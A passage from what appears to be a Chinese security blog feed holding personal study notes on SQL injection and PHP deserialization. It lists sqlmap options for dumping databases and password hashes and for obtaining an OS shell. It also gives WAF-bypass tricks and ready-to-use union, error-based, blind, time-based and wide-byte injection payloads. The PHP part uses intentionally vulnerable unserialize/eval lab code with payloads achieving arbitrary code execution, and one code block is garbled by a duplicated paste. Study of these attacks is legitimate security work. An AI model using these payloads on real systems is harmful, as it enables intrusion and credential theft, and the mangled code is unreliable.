plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap使用的payload可以在xml/payloads.xml</span><br><span class="line">-u / --url  </span><br><span class="line">python sqlmap.py -u “http://www.target.com/index.php?id=1”</span><br><span class="line">-m 从文本获取多个目标,每行只能有一个url,文本要在sqlmap目录中</span><br><span class="line">python sqlmap.py -m test.txt</span><br><span class="line">-r 从文件中加载HTTP请求(post,cookie的注入时方便)</span><br><span class="line">python sqlmap.py -r test.txt</span><br><span class="line">-v 显示等级 默认为1</span><br><span class="line">0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认等级）</span><br><span class="line">2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。6、同时显示HTTP响应页面。</span><br><span class="line">--data  post方式提交,参数后面接注入点,--data=&quot;admin&#x27;&quot; </span><br><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&#x27;&quot;</span><br><span class="line">--cookie  抓包获取登录web的cookie参数</span><br><span class="line">--cookie=”Cookie: Hm_lvt6910067,1546929561,1547001094,1547024662; PHPSESSID=o64fbvo316lg59njufl2gfutm4; ”</span><br><span class="line"></span><br><span class="line">--user-agent  默认sqlmap的HTTP请求头中是sqlmap/1.0-dev-xxxxxxxxx(http://sqlmap.org)</span><br><span class="line">sqlmap.py  -u “http://www.target.com” --level 3 --user-agent=”aaaaaa” --dbs</span><br><span class="line"></span><br><span class="line">--random-agent 从/usr/share/sqlmap/data/txt/user-agents.txt中随机产生User-Agent头。</span><br><span class="line">默认level&gt;=3才会去检查user-agent头是否存在注入漏洞</span><br><span class="line">--referer  HTTP Referer头  当--level参数设定&gt;=3时，会尝试进行referer注入。</span><br><span class="line">sqlmap.py  -u “http://www.target.com/?id=1”  --referer=”http://www.baidu.com</span><br><span class="line">--delay 可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。</span><br><span class="line">--timeout可以设定一个http请求超过多少秒判定为超时，默认是30秒。</span><br><span class="line">-p 指定参数 sqlmap 默认会测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User- Agent和HTTP Referer头的值。</span><br><span class="line">-p “id,user-angent”</span><br><span class="line">--skip 跳过指定参数</span><br><span class="line">--skip=”user-agent,referer”</span><br><span class="line">--level </span><br><span class="line">默认为1</span><br><span class="line">level&gt;=2的时候就会测试HTTP Cookie。</span><br><span class="line">level&gt;=3的时候就会测试HTTP User-Agent/Referer头。</span><br><span class="line">level=5 的时候会测试HTTP Host</span><br><span class="line">--risk 设定探测风险等级</span><br><span class="line">默认是1会测试大部分的测试语句</span><br><span class="line">2会增加基于时间的测试语句</span><br><span class="line">3会增加OR语句的SQL注入测试。</span><br><span class="line">在有些时候，例如在UPDATE，DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险</span><br><span class="line">--technique  指定注入类型  (B--盲注  Q--内联  T--时间  U--联合 E--错误  S--栈查询)</span><br><span class="line">--dbs当前数据库  --users列出当前登录的用户名  --passwords 列出当前登录的用户密码  --is-dba判断是否root权限   --current-db当前数据库 --privileges 权限 </span><br><span class="line">-D database_name -T table_name -C column_1,column_2  --dump</span><br><span class="line">--proxy指定代理服务器 -proxy http://local:8080</span><br><span class="line">--prefix 注入payload字符串前缀</span><br><span class="line">--suffix 注入payload字符串后缀</span><br><span class="line">eg：sqlmap -u “www.target.com/index.php?id=1” -p id --prefix “&#x27;))))” </span><br><span class="line">--suffix “AND (&#x27;1&#x27;=&#x27;1”</span><br><span class="line">移动文件 ： </span><br><span class="line">sqlmap -u “www.a.com/1.php?id=1” --file-write=”d:/2.txt” </span><br><span class="line">--file-dest=”E:/wwwroot/bihuoedu/one.php“</span><br><span class="line">--batch 全自动</span><br><span class="line">--start=开始条数 --stop=结束条数</span><br><span class="line">--dump 导出当前数据库所有数据</span><br><span class="line">--dump-all 导出数据库所有数据</span><br><span class="line">--purge 清空缓存目录 </span><br><span class="line">--sql-shell  反弹sqlshell,类似于sql查询分析器默认路径.sqlmap （点sqlmap）</span><br><span class="line">参数--os-shell（分析一下）</span><br><span class="line">前提：需要网站的物理路径，其次是需要有FIILE权限。</span><br><span class="line">sqlmap -r “C:\sqlmap\request.txt” -p id  --dms mysql --os-shell </span><br><span class="line">接下来指定网站可写目录：</span><br><span class="line">“C:\www”</span><br><span class="line">d:\phpstudy\www   (成功）</span><br></pre></td></tr></table></figure><h3 id="–os-shell流量分析"><a href="#–os-shell流量分析" class="headerlink" title="–os-shell流量分析"></a>–os-shell流量分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap的--os-shell在mysql数据库中的原理，其实就是往服务器上写入了两个php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页url中通过对cmd参数传参执行系统命令。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Sqlmap写shell"><a href="#Sqlmap写shell" class="headerlink" title="Sqlmap写shell"></a>Sqlmap写shell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.若存在注入，我们首先找到他的密码，然后进入网站后台进入后台我们就可以找上传点，然后上马拿shell</span><br><span class="line">2.使用一些参数，比如sqlmap -u “xxxxx” --file-write=&quot;/root/Desktop/1.txt&quot; --file-dest=“f:\1.txt” sqlmap写文件，需要dba权限</span><br><span class="line">3.--os-shell</span><br></pre></td></tr></table></figure><h2 id="SQL注入-绕safedog"><a href="#SQL注入-绕safedog" class="headerlink" title="SQL注入-绕safedog"></a>SQL注入-绕safedog</h2><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>变量代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">or 1 = 1----&gt;&gt;|| true = true</span><br><span class="line">group by -----&gt;&gt; oeder by</span><br></pre></td></tr></table></figure><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1 = 1 ---&gt;&gt; and /*!000001*/=/*!000001*/</span><br></pre></td></tr></table></figure><h4 id="垃圾填充"><a href="#垃圾填充" class="headerlink" title="垃圾填充"></a>垃圾填充</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(/**/----空格)/*1*/---&gt;&gt;(bp爆破intrude-&gt;Brute forecer)/*$1$*/----&gt;&gt;(填充垃圾)./*!+*$&amp;</span><br></pre></td></tr></table></figure><h4 id="换行-0a"><a href="#换行-0a" class="headerlink" title="换行%0a"></a>换行%0a</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 /*!union--+/*%0Aselect 1,2,3 */--+</span><br></pre></td></tr></table></figure><h4 id="like-“-23-”阻断"><a href="#like-“-23-”阻断" class="headerlink" title="like “[%23]”阻断"></a>like “[%23]”阻断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =&#x27;1&#x27; like &quot;[%23]&quot; union select * from referers</span><br><span class="line">阻断前面的输出结果,相当于</span><br><span class="line">select * from users where id =&#x27;-1&#x27;  union select * from referers</span><br></pre></td></tr></table></figure><h2 id="SQL注入payload"><a href="#SQL注入payload" class="headerlink" title="SQL注入payload"></a><strong>SQL注入payload</strong></h2><h5 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一 . 联合注入"></a>一 . 联合注入</h5><p>列出所有数据库 : </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>列出(数据库：test)中所有的表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来字段名</span><br><span class="line">select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br><span class="line">注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</span><br></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">imit 一个一个打印出来</span><br><span class="line">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来</span><br><span class="line">select username,password from security.users limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 把 一次性全部打印</span><br><span class="line">select group_concat(concat(username,0x20,password)) from security.users</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二 . 报错注入"></a>二 . 报错注入</h5><p>请注意,如果需要全部显示数据库需要用到substr函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(字符串,1,截取长度)</span><br><span class="line">select substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,7);</span><br></pre></td></tr></table></figure><h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错 :"></a>floor报错 :</h6><p>获取总共多少数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><p>列出数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单个列出 :</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1)),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure><p>查询表和字段直接把联合注入的payload放进去就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and(select 1 from (select count(*),concat(concat((payload),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure><h6 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, (concat(0x7e,(payload),0x7e)))</span><br><span class="line"></span><br><span class="line">and extractvalue(1, concat(0x7e,(select @@version),0x7e))</span><br><span class="line">and extractvalue(1,(concat(0x7e,(select group_concat(concat(username,0x20,password)) from security.users),0x7e)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>and extractvalue(1, concat(0x7e,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),0x7e))</p><h6 id="UpdateXML报错"><a href="#UpdateXML报错" class="headerlink" title="UpdateXML报错"></a>UpdateXML报错</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and updatexml(1,(payload),1)</span><br><span class="line"></span><br><span class="line">and updatexml(1, (concat(0x7e,(select user()),0x7e)),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三 .布尔注入 :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr((payload), 1, 1)))&gt;105 </span><br><span class="line">and (select ascii(substr((select password from security.users limit 1,1), 1, 1)) =73)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="四-时间注入"><a href="#四-时间注入" class="headerlink" title="四 . 时间注入 :"></a>四 . 时间注入 :</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((payload), 1, 1))=114, sleep(5), 1)</span><br><span class="line"></span><br><span class="line">if(ascii(substr((select password from security.users limit 1,1), 1, 1))=73, sleep(5), 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="五-宽字节注入"><a href="#五-宽字节注入" class="headerlink" title="五 .宽字节注入"></a>五 .宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id&#x27;%df</span><br><span class="line">GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为2字节</span><br><span class="line"></span><br><span class="line">如果使用了类似于set names gbk这样得语句,此时mysql数据库就会将</span><br><span class="line"></span><br><span class="line">Ascii大于128(%df)得字符当作是汉字字符得一部分,从而能吃掉\,引入单引号或者双引号</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化与反序列化-个人笔记</title>
      <link href="/2020/01/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/01/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP序列化与反序列化详解"><a href="#PHP序列化与反序列化详解" class="headerlink" title="PHP序列化与反序列化详解"></a>PHP序列化与反序列化详解</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化:将变量转换为可保存或传输的字符串的过程；</span><br><span class="line">反序列化:在适当的时候把这个字符串再转化成原来的变量使用。</span><br><span class="line">优点:这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</span><br></pre></td></tr></table></figure><h5 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例子:将一大段对象序列化压缩成字符串.然后根据要求反序列化重新构造对象.</span><br></pre></td></tr></table></figure><p><img src="/images/1666006709348.png" alt="例子-对象压缩成字符串"></p><p><img src="/images/1666006419469.png" alt="例子-字符串还原成对象"></p><h5 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再例如:网购家具,店家把家具拆分打包邮寄过来的过程就是序列化，反序列化就是买家根据说明书自定义将商品还原过程。</span><br></pre></td></tr></table></figure><p><img src="/images/1666070634202.png" alt="例子2-桌子拆分"></p><p><img src="/images/1666070684039.png" alt="例子2-桌子组装还原"></p><h3 id="字符解释"><a href="#字符解释" class="headerlink" title="字符解释"></a>字符解释</h3><h5 id="字符详解"><a href="#字符详解" class="headerlink" title="字符详解"></a>字符详解</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;tom&quot;;  s:11:&quot;Personage&quot;;  i:18;   s:6:&quot;*sex&quot;; s:3:&quot;boy&quot;;&#125;</span><br><span class="line"></span><br><span class="line">O : 自定义对象 object</span><br><span class="line">6  : 类名的长度</span><br><span class="line">:3 : 3个成员属性</span><br><span class="line">S:4 : 你的成员属性名  长度为4 ,并且是一个字符串   string</span><br><span class="line">S:3 : 刚刚那个成员属性对应的值 是string类型,并且长度是3位</span><br><span class="line">s:11:&quot;Personage&quot; : 因为该属性是私有属性,所以需要在属性名前加上类名,方便我们进行反序列化的时候的识别.</span><br><span class="line">i:18 :  18是age的属性值 , i是代表  integer类型</span><br><span class="line"></span><br><span class="line">s:6:&quot;*sex&quot;;  sex这个属性是一个受保护的属性,特征就是 * 号</span><br><span class="line"></span><br><span class="line">s:3:&quot;boy : 代表 string类型,属性值长度为3位  boy对应是  sex的属性值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/1666006992952.png" alt="字符解释"></p><h5 id="private和-protected详解"><a href="#private和-protected详解" class="headerlink" title="private和 protected详解"></a>private和 protected详解</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 序列化的时候 private和 protected 变量会引入不可见字符%00，%00类名%00属性名 为private，%00*%00属性名 为protected，注意这两个 %00就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚.我们可以将序列化的字符用urlencode编码之后,打印出来查看.</span><br></pre></td></tr></table></figure><p><img src="/images/1666007031526.png" alt="字符解释"></p><h3 id="PHP常见魔术方法"><a href="#PHP常见魔术方法" class="headerlink" title="PHP常见魔术方法"></a>PHP常见魔术方法</h3><h5 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct：构造函数,会在每次创建新对象时先调用此方法</span><br></pre></td></tr></table></figure><p><img src="/images/1666007580220.png" alt="__construct"></p><h5 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct：析构函数,会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure><p><img src="/images/1666007704969.png" alt="__destruct"></p><h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__toString：返回一个类被当做字符串时要输出的内容，此方法必须返回字符串并且不能在此方法中抛出异常，否则会产生致命错误。</span><br></pre></td></tr></table></figure><p><img src="/images/1666007830582.png" alt="__tostring"></p><h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__invoke：PHP5.3起，当尝试以函数的方式调用对象时，会调用此方法。</span><br></pre></td></tr></table></figure><p><img src="/images/1666007994884.png" alt="__invoke"></p><h5 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call : 在对象中调用一个不可访问方法时调用。</span><br></pre></td></tr></table></figure><p><img src="/images/1666008283124.png" alt="__call"></p><h5 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep：返回一个包含对象中所有应被序列化的变量名称的数组。serialize函数在序列化类时首先会检查类中是否存在__sleep方法。如果存在，会先调用此方法然后再执行序列化操作。并且只对__sleep返回的数组中的属性进行序列化。如果</span><br><span class="line">__sleep不返回任何内容，则null会被序列化，并产生E_NOTICE级别的错误。__sleep不能返回父类的私有成员，否则会产生E_NOTICE级别的错误。对于一些很大但不需要保存全部数据的对象此方法很有用。</span><br><span class="line">即序列化serialize时会调用__sleep.</span><br></pre></td></tr></table></figure><p><img src="/images/1666008877857.png" alt="__sleep"></p><h5 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup：与__sleep相反，是在unserialize函数反序列化时首先会检查类中是否存在__wakeup方法，如果存在会先调用次方法然后再执行反序列化操作。用于在反序列化之前准备一些对象需要的资源，或其他初始化操作。</span><br><span class="line">即反序列化unserialize时会自动调用__wakeup</span><br></pre></td></tr></table></figure><p><img src="/images/1666009217308.png" alt="__wakeup"></p><h3 id="PHP反序列化练习"><a href="#PHP反序列化练习" class="headerlink" title="PHP反序列化练习"></a>PHP反序列化练习</h3><h4 id="一-初步认识"><a href="#一-初步认识" class="headerlink" title="一.初步认识"></a>一.初步认识</h4><p>任务:通过传参让页面出现phpinfo界面</p><p>1.构建环境</p><p><img src="/images/1666010195924.png" alt="习题代码"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">action</span>();</span><br></pre></td></tr></table></figure><p>2,分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload   O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure><p>①新建新文件用于存放预构造的代码 </p><p>②实例化一个对象,将其序列化的内容打印出来</p><p>③得到其序列化的结果</p><p><img src="/images/1666010166025.png" alt="习题分析"></p><p>3.完成任务</p><p><img src="/images/1666010278300.png" alt="习题完成"></p><ol start="4"><li>加班-&gt;任意代码执行</li></ol><p><img src="/images/1666010371475.png" alt="习题代码"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class one</span><br><span class="line">&#123;</span><br><span class="line">    var $b = &#x27;phpinfo();&#x27;;</span><br><span class="line"></span><br><span class="line">    function action()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = unserialize($_GET[1]);</span><br><span class="line">$a-&gt;action();</span><br></pre></td></tr></table></figure><p>5.习题解析</p><p>新建新文件用于存放预构造的代码,重新构造代码,将其实例化一个对象,把其序列化的内容打印出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/1666010911581.png" alt="习题解析"></p><p>6.执行命名,例如echo 123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">paload O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;&amp;2=echo 123;</span><br></pre></td></tr></table></figure><p><img src="/images/1666010872030.png" alt="习题完成"></p><p>总结 :在考虑完过滤等先决条件后,找到可控点,构造成我们想要执行的代码,将其反序列化利用。这个过程不要去看原来代码想要执行的,关键是去构造你要执行的</p><h4 id="二-简单利用"><a href="#二-简单利用" class="headerlink" title="二.简单利用"></a>二.简单利用</h4><p>任务:输出phpinfo或者其他任意代码执行</p><p>1.构建环境</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p><img src="/images/1666012058017.png" alt="习题代码"></p><p>2.解析,同理</p><p>①新建新文件用于存放预构造的代码 </p><p>②实例化一个对象,将其序列化的内容打印出来</p><p>③得到其序列化的结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload O:7:&quot;Student&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/1666012436784.png" alt="习题解析"></p><p>3.完成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload O:7:&quot;Student&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;&#125;&amp;2=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/images/1666012363178.png" alt="习题完成"></p><h4 id="三-相关绕过"><a href="#三-相关绕过" class="headerlink" title="三.相关绕过"></a>三.相关绕过</h4><p>任务:访问当前目录的1.txt文件</p><p>1.构造环境:当前目录创建1.txt 输入任意内容,通过反序列化读取文件内容</p><p><img src="/images/1666013578861.png" alt="构造环境"></p><p>习题代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(1);</span><br><span class="line">echo $_GET[&#x27;data&#x27;];</span><br><span class="line">class baby</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function &lt;?php</span><br><span class="line">@error_reporting(1);</span><br><span class="line">echo $_GET[&#x27;data&#x27;];</span><br><span class="line">class baby</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = &quot;./&#123;$this-&gt;file&#125;&quot;;</span><br><span class="line">            if (file_get_contents($filename))</span><br><span class="line">            &#123;</span><br><span class="line">                return file_get_contents($filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;data&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[&#x27;data&#x27;];</span><br><span class="line">    preg_match(&#x27;/[oc]:\d+:/i&#x27;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;Hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(&quot;./test4.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = &quot;./&#123;$this-&gt;file&#125;&quot;;</span><br><span class="line">            if (file_get_contents($filename))</span><br><span class="line">            &#123;</span><br><span class="line">                return file_get_contents($filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;data&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[&#x27;data&#x27;];</span><br><span class="line">    preg_match(&#x27;/[oc]:\d+:/i&#x27;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;Hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(&quot;./test4.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/1666013621550.png" 